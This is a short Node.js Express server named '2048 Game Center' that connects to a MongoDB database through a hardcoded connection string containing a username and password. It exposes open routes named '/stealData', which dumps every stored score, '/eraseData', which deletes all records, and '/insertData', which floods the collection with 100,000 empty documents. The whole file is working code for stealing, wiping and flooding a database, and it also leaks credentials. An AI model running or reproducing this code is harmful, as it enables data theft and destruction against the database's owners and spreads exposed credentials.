var http = require('http');
var express = require('express');
var mongo = require('mongodb').MongoClient;
var bodyParser = require('body-parser');
var app = express();

app.set('port', (process.env.PORT || 5000));
app.set('title', '2048 Game Center');

app.use(bodyParser());

var mongoUri = process.env.MONGOLAB_URI || process.env.MONGOHQ_URL || 'mongodb://heroku_4wjj5053:8jv9mgmgn1p6nj8r9i2om41c9l@ds157677.mlab.com:57677/heroku_4wjj5053';

var db = mongo.connect(mongoUri, function(error, databaseConnection) {
    db = databaseConnection;
});

app.get('/', function(request, response) {
    response.send(200);
});


app.get('/stealData', function(request, response) {
    db.collection('scores', function(er, collection) {
        var curr_collection = collection.find().toArray(function(err, x) {
            
            response.send(x);
        });
    });
});

app.get('/eraseData', function(request, response) {
    db.collection('scores', function(er, collection) {
        collection.remove({});
        response.send(200);
    });
});

app.get('/insertData', function(request, response) {
    db.collection('scores', function(er, collection) {
        for(var i = 0; i < 100000; i++)
            collection.insert({});
        response.send(200);
    });
});

app.listen(app.get('port'), function() {
    console.log('Node app is running on port', app.get('port'));
});
